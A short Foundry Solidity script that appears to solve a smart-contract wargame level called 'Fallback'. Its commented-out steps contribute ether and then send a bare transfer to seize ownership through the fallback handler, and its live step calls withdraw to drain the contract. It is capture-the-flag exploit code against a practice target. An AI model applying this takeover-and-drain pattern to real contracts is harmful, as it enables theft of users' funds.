// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import { Fallback } from "../src/Fallback.sol";

contract FallbackSolver is Script {
	
	Fallback public  instance = Fallback(payable(0x53c735c03B5Edd738778d30f117366e3eb47F931));

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run () external {


		// instance.contribute();

		vm.startBroadcast(prv);

		// (bool ok1, bytes memory data1) = address(instance).call{value: 0.00001 ether}(
		// 	abi.encodeWithSignature("contribute()")
		// );

		// require(ok1, "something wrong with contribute()");

		// (bool ok2, bytes memory data2) = address(instance).call{value: 0.0000001 ether}("");
		// console.logAddress(instance.owner());

		instance.withdraw();

		vm.stopBroadcast();

	}

}
